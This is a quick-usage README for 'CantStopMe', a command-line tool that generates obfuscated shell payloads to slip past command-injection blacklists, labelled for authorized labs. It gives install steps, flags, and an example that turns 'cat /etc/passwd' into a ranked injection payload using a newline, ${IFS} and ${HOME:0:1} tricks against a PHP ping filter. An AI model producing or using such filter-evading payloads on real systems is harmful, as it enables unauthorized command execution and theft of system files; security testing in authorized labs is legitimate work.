# Quick usage (CantStopMe)

**Authorized labs only.**

## 1. Install

```bash
git clone https://github.com/VNSaoRoi/CantStopMe.git
cd CantStopMe
python3 -m venv .venv
source .venv/bin/activate          # Windows: .venv\Scripts\activate
pip install -r requirements.txt
pip install -e .
```

Run from the **repository root** so `rules/` and `blacklist_pool/` resolve correctly.

## 2. Obfuscate

```bash
python cantstopme.py -c "cat /etc/passwd" -b examples/php_ping_filter.txt --ping --url-encode -n 10
```

Example rank-1 output:

```text
[1] primary  (score 49)
    rules: newline_lf, space_ifs, slash_home_expand
    1.1.1.1%0acat${IFS}${HOME:0:1}etc${HOME:0:1}passwd
```

## 3. Blacklist (`-b` and `--use-pool`)

| Invocation | Filter source |
|------------|----------------|
| No `-b` | `blacklist_pool/pool.yaml` only |
| `-b file.txt` | Your overlay file only |
| `-b file.txt --use-pool` | **pool.yaml + file** merged |

## 4. Flags

| Flag | Meaning |
|------|---------|
| `-n 10` | Number of ranked payloads (default 10) |
| `--ping` | Prepend `1.1.1.1` + newline / `%0a` |
| `--url-encode` | Newline as `%0a`; spaces use `${IFS}` |
| `--explain -c "CMD"` | Matching rules, no payload |
| `--json` | Machine-readable output |
| `-v` | Scores on stderr |

## 5. PHP ping lab

See [examples/PHP_PING_LAB.md](examples/PHP_PING_LAB.md) and `examples/php_ping_filter.txt`.

## 6. Troubleshooting

- Missing `yaml` -> `pip install -r requirements.txt`
- Missing `-c` -> required (except `--stats`)
- Rules not found -> run CLI from repo root after `pip install -e .`
